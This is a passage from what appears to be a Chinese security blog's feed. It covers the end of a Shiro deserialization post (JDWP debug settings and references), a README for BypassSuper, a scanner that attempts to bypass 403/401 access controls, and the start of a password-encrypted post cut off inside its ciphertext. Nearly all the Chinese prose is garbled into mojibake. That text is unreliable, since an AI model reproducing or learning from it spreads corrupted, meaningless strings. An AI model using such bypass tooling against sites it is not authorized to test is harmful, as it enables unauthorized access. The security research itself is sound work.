title="è¯¾å¤–çŸ¥è¯†è¡¥å……"></a>è¯¾å¤–çŸ¥è¯†è¡¥å……</h2><h3 id="springboot-debugæŠ€å·§"><a href="#springboot-debugæŠ€å·§" class="headerlink" title="springboot debugæŠ€å·§"></a>springboot debugæŠ€å·§</h3><p>åœ¨é…ç½®ä¸­VM options è¾“å…¥<code>-Xms512m -Xmx512m -Xmn164m -XX:MaxPermSize=250m -XX:ReservedCodeCacheSize=64m -Dserver.port=8001 -ea</code><br><img src="https://img-blog.csdnimg.cn/202101221712423.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŒæ—¶åœ¨é…ç½®æ–‡ä»¶pom.xmlåŠ å…¥</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">            &lt;jvmArguments&gt;</span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span></span><br><span class="line">            &lt;/jvmArguments&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br></pre></td></tr></table></figure><h3 id="VScodeæ·»åŠ æ’ä»¶"><a href="#VScodeæ·»åŠ æ’ä»¶" class="headerlink" title="VScodeæ·»åŠ æ’ä»¶"></a>VScodeæ·»åŠ æ’ä»¶</h3><p>Hex Editoræ’ä»¶</p><p><img src="https://img-blog.csdnimg.cn/20210122171520346.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ•ˆæœå¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210122171541915.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Git-è‡ªå¸¦-xxdå·¥å…·"><a href="#Git-è‡ªå¸¦-xxdå·¥å…·" class="headerlink" title="Git è‡ªå¸¦ xxdå·¥å…·"></a>Git è‡ªå¸¦ xxdå·¥å…·</h3><p>å°†å·¥å…·è·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡<br><img src="https://img-blog.csdnimg.cn/20210122171754706.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210122172003896.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a><br><a href="https://paper.seebug.org/1378" target="_blank" rel="noopener">https://paper.seebug.org/1378</a><br><a href="https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a><br><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Shiroååºåˆ—åŒ–æ¼æ´ç›®å‰ä¸ºæ­¢æœ‰ä¸¤ä¸ªï¼ŒShiro-550&lt;code&gt;(Apache  Shiro &amp;lt; 1.2
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java ååºåˆ—åŒ–" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BypassSuperä½¿ç”¨ä»‹ç»è¯´æ˜</title>
    <link href="https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <id>https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-02-05T00:22:16.000Z</published>
    <updated>2021-01-22T12:15:07.687Z</updated>
    
    <content type="html"><![CDATA[<h1 align="center">BypassSuper</h1><h3 align="center">ä¸€æ¬¾é’ˆå¯¹403/401é¡µé¢è¿›è¡Œå¿«é€Ÿã€é«˜æ•ˆå°è¯•Bypassçš„æ‰«æå·¥å…·</h3> <p align="center">    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/python-3.X-blueviolet"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/Bypass-Super-green"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Forks" src="https://img.shields.io/github/forks/SummerSec/BypassSuper"></a>     <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Release" src="https://img.shields.io/github/release/SummerSec/BypassSuper.svg"></a>  <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Stars" src="https://img.shields.io/github/stars/SummerSec/BypassSuper.svg?style=social&label=Stars"></a>     <a href="https://github.com/SummerSec" target="_blank" rel="noopener"><img alt="Follower" src="https://img.shields.io/github/followers/SummerSec.svg?style=social&label=Follow"></a>    <a href="https://twitter.com/SecSummers" target="_blank" rel="noopener"><img alt="SecSummers" src="https://img.shields.io/twitter/follow/SecSummers.svg"></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="49.6"></rect></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="17.0" x="49.6"></rect></a>    </p><p><img src="https://visitor-badge.laobi.icu/badge?page_id=SummerSec.BypassSuper" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                ______                            _____</span><br><span class="line">                | ___ \                          &#x2F;  ___|</span><br><span class="line">                | |_&#x2F; &#x2F;_   _ _ __   __ _ ___ ___ \ &#96;--. _   _ _ __   ___ _ __</span><br><span class="line">                | ___ \ | | | &#39;_ \ &#x2F; _&#96; &#x2F; __&#x2F; __| &#96;--. \ | | | &#39;_ \ &#x2F; _ \ &#39;__|</span><br><span class="line">                | |_&#x2F; &#x2F; |_| | |_) | (_| \__ \__ \&#x2F;\__&#x2F; &#x2F; |_| | |_) |  __&#x2F; |</span><br><span class="line">                \____&#x2F; \__, | .__&#x2F; \__,_|___&#x2F;___&#x2F;\____&#x2F; \__,_| .__&#x2F; \___|_|</span><br><span class="line">                        __&#x2F; | |                              | |</span><br><span class="line">                       |___&#x2F;|_|                              |_|</span><br><span class="line">                    author: summersec</span><br><span class="line">                    version: 1.0</span><br><span class="line">                    Github: https:&#x2F;&#x2F;github.com&#x2F;SummerSec&#x2F;BypassSuper</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure><h2 id="ğŸ‘®ğŸ»â€â™€ï¸-å…è´£å£°æ˜"><a href="#ğŸ‘®ğŸ»â€â™€ï¸-å…è´£å£°æ˜" class="headerlink" title="ğŸ‘®ğŸ»â€â™€ï¸ å…è´£å£°æ˜"></a>ğŸ‘®ğŸ»â€â™€ï¸ å…è´£å£°æ˜</h2><p>&emsp;&emsp; ç”±äºä¼ æ’­ã€åˆ©ç”¨BypassSuperå·¥å…·ï¼ˆä¸‹ç®€ç§°æœ¬å·¥å…·ï¼‰æä¾›çš„æ£€æµ‹åŠŸèƒ½è€Œé€ æˆçš„<strong>ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±</strong>ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œå¼€å‘è€…æœ¬äºº<strong>ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»</strong>ã€‚</p><p>&emsp;&emsp; æœ¬å·¥å…·ä¼šæ ¹æ®ä½¿ç”¨è€…æ£€æµ‹ç»“æœ<strong>è‡ªåŠ¨ç”Ÿæˆ</strong>æ‰«æç»“æœæŠ¥å‘Šï¼Œæœ¬æŠ¥å‘Šå†…å®¹åŠå…¶ä»–è¡ç”Ÿå†…å®¹å‡<strong>ä¸èƒ½ä»£è¡¨</strong>æœ¬äººçš„ç«‹åœºåŠè§‚ç‚¹ã€‚</p><p>&emsp;&emsp; è¯·åœ¨ä½¿ç”¨æœ¬å·¥å…·æ—¶éµå¾ªä½¿ç”¨è€…ä»¥åŠç›®æ ‡ç³»ç»Ÿæ‰€åœ¨å›½å½“åœ°çš„<strong>ç›¸å…³æ³•å¾‹æ³•è§„</strong>ï¼Œä¸€åˆ‡<strong>æœªæˆæƒæµ‹è¯•å‡æ˜¯ä¸è¢«å…è®¸çš„</strong>ã€‚è‹¥å‡ºç°ç›¸å…³è¿æ³•è¡Œä¸ºï¼Œæˆ‘ä»¬å°†<strong>ä¿ç•™è¿½ç©¶</strong>æ‚¨æ³•å¾‹è´£ä»»çš„æƒåˆ©ï¼Œå¹¶<strong>å…¨åŠ›é…åˆ</strong>ç›¸å…³æœºæ„å±•å¼€è°ƒæŸ¥ã€‚</p><h2 id="dragon-æ¥é¾™å»è„‰"><a href="#dragon-æ¥é¾™å»è„‰" class="headerlink" title=":dragon:æ¥é¾™å»è„‰"></a>:dragon:æ¥é¾™å»è„‰</h2><p>&emsp;&emsp; åœ¨æŸç¾¤é‡Œçœ‹åˆ°å¤§ä½¬å‘äº†ä¸ªè¿™ä¸ªé¡¹ç›®<a href="https://github.com/sting8k/BurpSuite_403Bypasser" target="_blank" rel="noopener">BurpSuite_403Bypasser</a>ï¼Œç„¶åçœ‹äº†ä¸€çœ¼è¿™ä¸ªå…·ä½“å®ç°åŠŸèƒ½ã€‚å› ä¸ºåœ¨æ­¤ä¹‹å‰åœ¨æ¨ç‰¹ä¸Šçœ‹åˆ°å›½é™…å‹äººå‘è¿‡ç±»ä¼¼çš„tipsï¼Œå½“æ—¶å°±æŒºæ„Ÿå…´è¶£çš„ã€‚ä½†æ‰¾äº†ä¸€åœˆå¹¶æ²¡æœ‰å‘ç°æœ‰ä»€ä¹ˆç°æˆçš„æ‰«æå™¨æˆ–è€…burpæ’ä»¶ï¼Œå½“æ—¶æ˜¯ä¸äº†äº†ä¹‹ã€‚è¿™ä¸ªé¡¹ç›®å‘ç°ä¹‹åï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´å°±å»çœ‹äº†ä¸€çœ¼æºä»£ç ï¼Œè¾“å‡ºæ—¥å¿—ï¼Œå‘ç”Ÿå¾ˆå¤špayloadå’Œå†…å®¹å¼€å‘è€…æ˜¯ç†è§£é”™çš„ï¼Œæˆ–è€…æ˜¯å§¿åŠ¿ä¸å¯¹ã€‚å½“ç„¶æˆ‘å‘ç°ä¹‹åï¼Œæˆ‘å¼€å§‹åŠ¨æ‰‹åœ¨æ­¤æºç ä¸Šå¼€å§‹æˆ‘çš„ä¿®æ”¹ä¹‹è·¯ã€‚æˆªè‡³æœ¬æ–‡å‘å¸ƒæ—¶é—´ä¸ºæ­¢ï¼Œä¹Ÿæœ‰äººå‘ç°è¿™ä¸ªé—®é¢˜ï¼Œè¯¦æƒ…å‚è€ƒï¼š<a href="https://github.com/sting8k/BurpSuite_403Bypasser/issues/4" target="_blank" rel="noopener">https://github.com/sting8k/BurpSuite_403Bypasser/issues/4</a></p><hr><h2 id="zap-Installation"><a href="#zap-Installation" class="headerlink" title=":zap: Installation"></a>:zap: Installation</h2><h3 id="BypassSuper-Burp"><a href="#BypassSuper-Burp" class="headerlink" title="BypassSuper-Burp"></a>BypassSuper-Burp</h3><p>&emsp;&emsp; <code>BurpSuite -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Extension Type: Python -&gt; Select file: BypassSuper-Burp.py -&gt; Next till Fininsh</code></p><hr><h3 id="BypassSuper"><a href="#BypassSuper" class="headerlink" title="BypassSuper"></a>BypassSuper</h3><p>&emsp;&emsp; <code>pip3 install -r requirements.txt  --&gt; python3 BypassSuper.py -h</code></p><hr><h2 id="clap-å‚æ•°ä»‹ç»"><a href="#clap-å‚æ•°ä»‹ç»" class="headerlink" title=":clap: å‚æ•°ä»‹ç»"></a>:clap: å‚æ•°ä»‹ç»</h2><p>&emsp;&emsp; æ‚¨å¯ä»¥ä½¿ç”¨<code>python3 BypassSuper.py [options]</code>å‘½ä»¤æ¥è¿è¡Œæœ¬å·¥å…·ï¼Œ<code>options</code>å†…å®¹è¡¨è¿°å¦‚ä¸‹ï¼š</p><ul><li><p>-hï¼ˆâ€“helpï¼‰</p><p>å¸®åŠ©å‘½ä»¤ï¼Œæ— éœ€é™„åŠ å‚æ•°ï¼ŒæŸ¥çœ‹æœ¬å·¥å…·æ”¯æŒçš„å…¨éƒ¨å‚æ•°åŠå…¶å¯¹åº”ç®€ä»‹ï¼›</p></li><li><p>-u ï¼ˆâ€“urlï¼‰<br>è¦æ‰«æçš„ç½‘ç«™ç½‘å€è·¯å¾„ï¼Œä¸ºå¿…å¡«é€‰é¡¹ä¹‹ä¸€ï¼Œä¾‹å¦‚ï¼š<code>-u https://www.baidu.com</code>ï¼›</p><ul><li>-f ï¼ˆâ€“fileï¼‰<br>è¦æ‰«æçš„ç½‘ç«™ç½‘å€è·¯å¾„æ–‡ä»¶ï¼Œä¸ºå¿…å¡«é€‰é¡¹ä¹‹ä¸€ï¼Œä¾‹å¦‚ï¼š<code>-f target.txt</code>ï¼›</li><li>-t ï¼ˆâ€“threadsï¼‰<br>æ‰«æçº¿ç¨‹æ•°é‡ï¼Œä¸ºé€‰å¡«é€‰é¡¹ï¼Œé…åˆ-få‚æ•°ä½¿ç”¨ï¼Œè¦æ±‚å¿…é¡»<code>targetæ•°é‡å¤§äºçº¿ç¨‹æ•°é‡ï¼ˆé»˜è®¤20ï¼‰</code>ä¸ç„¶æ— æ³•æ‰§è¡Œï¼Œä¾‹å¦‚ï¼š<code>-f target.txt -t 20</code></li></ul></li></ul><hr><h2 id="clapper-Screenshot"><a href="#clapper-Screenshot" class="headerlink" title=":clapper:Screenshot"></a>:clapper:Screenshot</h2><p><img src="https://img-blog.csdnimg.cn/20201207095047803.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>&emsp;&emsp; å®‰è£…å®Œæˆåè‡ªåŠ¨æ‰«æï¼Œåœ¨ä¸¤ä¸ªåœ°æ–¹å¯ä»¥æŸ¥çœ‹åˆ°æ‰«æç»“æœã€‚ç¬¬ä¸€ä¸ªï¼šåœ¨targeté‡Œé¢ï¼Œè®¾ç½®è¿‡æ»¤å™¨å…¨éƒ¨æ˜¾ç¤ºæˆ–è€…æ˜¾ç¤º4xxã€‚<br><img src="https://img-blog.csdnimg.cn/20201206225513435.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20201207094215278.png" alt="ä¸¤ä¸ª"></p><p>&emsp;&emsp;  ç¬¬äºŒä¸ªåœ°æ–¹åœ¨ä»ªè¡¨ç›˜<br><img src="https://img-blog.csdnimg.cn/20201207094338881.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; åœ¨æ’ä»¶æ‹“å±•é‡Œé¢å¯ä»¥çš„UIå¯ä»¥æŸ¥çœ‹æ‰«æè¿‡ç¨‹ï¼ˆå»ºè®®ç›´æ¥è¾“å‡ºåˆ°æ–‡ä»¶æ–¹ä¾¿æŸ¥çœ‹ï¼ŒUIé‡Œé¢åªèƒ½æŸ¥çœ‹éƒ¨åˆ†ï¼Œä¼šè¢«è¦†ç›–ï¼‰ã€‚<br><img src="https://img-blog.csdnimg.cn/20201207094526995.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20201207095902133.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="clapper-å®é™…æ¡ˆä¾‹"><a href="#clapper-å®é™…æ¡ˆä¾‹" class="headerlink" title=":clapper:å®é™…æ¡ˆä¾‹"></a>:clapper:å®é™…æ¡ˆä¾‹</h2><p>&emsp;&emsp; é¶åœºæ¡ˆä¾‹<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" target="_blank" rel="noopener">URL-based access control can be circumvented</a>ï¼Œè¿™ä¸ªæ˜¯portswiggerå®˜æ–¹ç»™çš„å®é™…æ¡ˆä¾‹ã€‚<del>æ‚„å’ªå’ªè¯´ä¸€å¥ï¼Œä¸Šé¢ç»™çš„æˆªå±æ˜¯ä¸€ä¸ªçœŸå®SRCæ¡ˆä¾‹ï¼</del><br>å®ç”¨burpæ’ä»¶æ•ˆæœ<br><img src="https://img-blog.csdnimg.cn/20210122195343459.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨BypassSuperè„šæœ¬æ•ˆæœ<br><img src="https://img-blog.csdnimg.cn/20210122201042177.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="memo-TODO"><a href="#memo-TODO" class="headerlink" title=":memo: TODO"></a>:memo: TODO</h2><ul><li><input disabled type="checkbox"> æ·»åŠ å‚æ•°Bypassè§„åˆ™</li><li><input disabled type="checkbox"> é‡æ„ä»£ç ï¼Œç›®å‰æ‰€æœ‰æºç éƒ½åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¤ªæ‚äº†</li><li><input disabled type="checkbox"> è‡ªåŠ¨æ‰«æç½‘é¡µä¸­çš„apiæ¥å£å®ç°BypassSuperä¸­çš„â€œJSFinderâ€</li><li><input disabled type="checkbox"> ç›®å½•çˆ†ç ´ï¼Œé…åˆJSFinder</li><li><input disabled type="checkbox"> è‡ªåŠ¨çˆ¬å–ç½‘é¡µå®ç°çˆ¬è™«åŠŸèƒ½å‘ç°æ›´å¤šé¡µé¢å’Œæ¥å£</li></ul><hr><h2 id="ğŸ“-æ„è§äº¤æµ"><a href="#ğŸ“-æ„è§äº¤æµ" class="headerlink" title="ğŸ“ æ„è§äº¤æµ"></a>ğŸ“ æ„è§äº¤æµ</h2><hr><p>&emsp;&emsp; æ‚¨å¯ä»¥ç›´æ¥åœ¨GIthubä»“åº“ä¸­æäº¤ISSUEï¼š<a href="https://github.com/SummerSec/BypassSuper/issues" target="_blank" rel="noopener">https://github.com/SummerSec/BypassSuper</a>äº¦æˆ–è€…å‘é€é‚®ä»¶åˆ°summersec[@]qq.com</p><h2 id="hotsprings-å·²çŸ¥é—®é¢˜"><a href="#hotsprings-å·²çŸ¥é—®é¢˜" class="headerlink" title=":hotsprings:å·²çŸ¥é—®é¢˜"></a>:hotsprings:å·²çŸ¥é—®é¢˜</h2><ul><li><a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">Exception: local variable â€˜reqâ€™ referenced before assignmentæ­¤é—®é¢˜æ˜¯ä¸»æœºè®¾ç½®å…¨å±€ä»£ç†é—®é¢˜ï¼Œç›®å‰æ²¡æœ‰æ·»åŠ ä»£ç†åŠŸèƒ½ã€‚</a> è§£å†³åŠæ³•ï¼š<a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">å…³é—­å…¨å±€ä»£ç†</a><br><img src="https://img-blog.csdnimg.cn/20201207100058886.png" alt></li><li><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">ç»“æœcsvæ–‡ä»¶ä¸­æ–‡ä¹±ç å¹¶ä¸”æ ¼å¼ä¸å¯¹ã€‚</a><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">è§£å†³åŠæ³•</a></li></ul><hr><h2 id="book-References"><a href="#book-References" class="headerlink" title=":book: References"></a>:book: References</h2><ul><li><p><a href="https://twitter.com/iam_j0ker/status/1324354024657711106?s=20" target="_blank" rel="noopener">https://twitter.com/iam_j0ker/status/1324354024657711106?s=20</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1297556269960540161?s=20" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1297556269960540161?s=20</a></p></li><li><p><a href="https://twitter.com/SalahHasoneh1/status/1296572143141031945" target="_blank" rel="noopener">https://twitter.com/SalahHasoneh1/status/1296572143141031945</a></p></li><li><p><a href="https://twitter.com/infosecsanyam/status/1331146922011324417" target="_blank" rel="noopener">https://twitter.com/infosecsanyam/status/1331146922011324417</a></p></li><li><p><a href="https://twitter.com/i_hack_everyone/status/1332027600726753280" target="_blank" rel="noopener">https://twitter.com/i_hack_everyone/status/1332027600726753280</a></p></li><li><p><a href="https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70" target="_blank" rel="noopener">https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1333811754745249792" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1333811754745249792</a></p></li><li><p><a href="https://twitter.com/h4x0r_dz/status/1317218511937261570" target="_blank" rel="noopener">https://twitter.com/h4x0r_dz/status/1317218511937261570</a></p></li><li><p><a href="https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md" target="_blank" rel="noopener">https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md</a></p></li></ul><hr><p> <a href="https://starchart.cc/SummerSec/BypassSuper" target="_blank" rel="noopener"><img src="https://starchart.cc/SummerSec/BypassSuper.svg" alt="Stargazers over time"></a> </p><img align="right" src="https://profile-counter.glitch.me/summersec/count.svg" width="200">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 align=&quot;center&quot;&gt;BypassSuper&lt;/h1&gt;
&lt;h3 align=&quot;center&quot;&gt;ä¸€æ¬¾é’ˆå¯¹403/401é¡µé¢è¿›è¡Œå¿«é€Ÿã€é«˜æ•ˆå°è¯•Bypassçš„æ‰«æå·¥å…·&lt;/h3&gt;
 &lt;p align=&quot;center&quot;&gt;
    &lt;a href=&quot;https://githu
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="https://summersec.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="æœªæˆæƒ 401 403" scheme="https://summersec.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83-401-403/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€é“shiroååºåˆ—åŒ–é¢˜ç›®å¼•å‘çš„æ€è€ƒ</title>
    <link href="https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2021-01-05T00:22:16.000Z</published>
    <updated>2021-01-22T12:15:29.008Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="39f52711c8aa7ee6fb2d497fba360365c0c01e8f917549d6249099dc2026902a">660e1430c9014f049a3f1080ed1fc3b29e9ccb6963fd15ab8744666d3a501df7335e8159f53ae9e2e0a6ddee63c610f2091c6aff36d57d662844be10b5ce51aa88c9c283ad5fe4a2afb8a48304f77d50be487809667dc440881d9e754548ca7ffcdf8576f6981967491b2cbe38323a0624c150cc2224e443d38cac36eb6bcf5d2f8c7ada0b46ce875ea335f1500badb690dbd1489464c55477ccdf888f8f4773c8c1c3b1d061e3e166867e805bbe8d4cb0d6758ef6ba1a5bbe4676a2f5a1ed20eb81f28cfc7ff842803ec757a1a9cfd111823dafa41a9f9cbce23c6ac2a19d329ec2846f61758a6828f16351e71be266a3f9750aff3a1f76f512a1be3a9f525f1d9941b93b7505a8cf652bd07360b374d20ca712b0cdfc91f25fa2a00d1f9aa0932772cbeeb5d4c8cded7faa90a306cba08cb7e9b6d90aa9eaa31880f9d44ed4b1a8d1c823e61ed37b073e8ae3b9cf2951b4d0262198474fb2803ff466c68a372676188ee6286e6f8a27348b9664bc2254d0c2eb2a80c60bb10b7b246f24d27a1288e94e0dd95fdb035774398423ffa2cd3fc22178c6adac2adb1390b927fd51c9e3a4d58a64542483d93ff3d7900d2861b14f5c5c8e71644742176042970a13bac1040820d4dff35699a3c9cb7f15e9a2eb1975fde008664be0edd081ce0d88b6c6d8275541e84896cf0d553be35b0157befc80ec629f54b82a0dfc422eaf972d0178969252f62ef72d99d2f6b3defc54ae8c9505022dabeb6b9bf776f0f995cd1e141e7ee8b9c338ddaa4921745fee960dd1e897365d4af1d935dd8ca79e65c951140e1905b79fd2a7ef85482259c5b6ecffc31f3b44071846b2ba6aa975e5b7dd6b37f4d203c3f9ea2437a13a569e9b0f478de036117da8b14f38a2e5e099cd337f8f315e847545e495aee71936ce2f451ab0c5b26cae3bbd5c09e8d2386773538e8e1e43fc0068c640a47749e9412eacacc91720e0d521434f98135ada5201af0ef1e9c706271787ca0de3d0386043aeb5cb67fbd80508d0537fb74d37917a09fb18d54b73e243bac8a0d3cd327e585d5ee97b9ebf5ee27ec03d88b133189d727bde8cc7690b8a5535a85315d9f6e4db26a0bc2e1686cfd61c3c88d5f4425e619d2efa3cd840f3e4842481494e55127b48cd38e0d337723bda808a026a882cee679219ebb8842a9d061fcc627e5045a7263c9cd613f3c1e4d0673333d9486dcaf0399bbc45b53051a10244c6485f8a350bd29ba22ab3e80feb81c32e1e622ae5912459fcb3328617cea069d9e04e0cfd3e8ab821667e1b1fe91677b62240570c569d722e3f61354b76561dbf19bebcd2221e3e87009e9cff90bd8ff762f9e29cf306c42963217069f7f985510ac05f90c642ae4d19742daf80f6ddee450a999cd0c9421efea17ae34d14055350518d0dcda1cdbabe42dbbd9ef18a98eba68bb3cb8394078e01c7823ecf0f5549928928a3c4b7f9687557c53d22c517328773c1164276c9f77c2ce7fb33c1f86f9ae33fb6241a9c7afbfe67d6ecf3567d243254596a109a1aa27b2594059d7892517ea48b6177472021267d6f335b10298cdb41d2f31171a351453ca6dc532e35cff74dcc027eb569e157e6c84a0ac08c8f4165ba114cc9cc4696b74760699601c09918e862ecadc833e97d6caa8b58da80799089032726945fea0f540f1783caabc95f2b4d9dc7c876eacfe50f96221ca154702627c1e16cbd1e6d8770683ae38d6bc8fc52cbcf497169405ba517946e11dce701c4af88b80bef5f869f591c5d7043ad89ee45282eb4f9af2f998db891be26d3d914787da695735babdedaee63907130cdfcf9cdfd72ba31a3a6fc6296d358ad97a2ed0e8c1ddb5e9d71e29d2ec9cc4ac596b79b6d98457842cccb0c4cecf3185fc5748e65dd9a21aa0506491ff30585c386e6eafd2d7ca16833da3b576b87875bb8b1b4518f7745981cd88ea9630d9dc91315b6599919c8606c7afabd88e524bd49b5e98713c9e2a14fe0fbafab72faf5d00459a0209d48dfdff5c8da94ec285db1cd88269bd023d9f2bafb4900550d79e418d0ebfcec20432345dac17dee22c329f0fcac1e1c320887e3027aced9efa8b3e2ee3dee7582b0480cb0a9b3c2ff8d11919b5bca40046fe75efe49f2e25605cd93bbff0e313055191e381315bedd5286f06340d84bc06510c095df2aee09c8d1ed5e115738d1b415aca1d455dc4169f622fe73369b88b139c20372810198974e7c54e7b5eab7e9d7cc3b568e71a10afcbe8e2d5a09922c303daee4515d5b53ead709abf8134e97f55f4039826ee56b3330b2cd959b52447f5e71ca68de570a9a21969def3804fe19366e8f74b98f058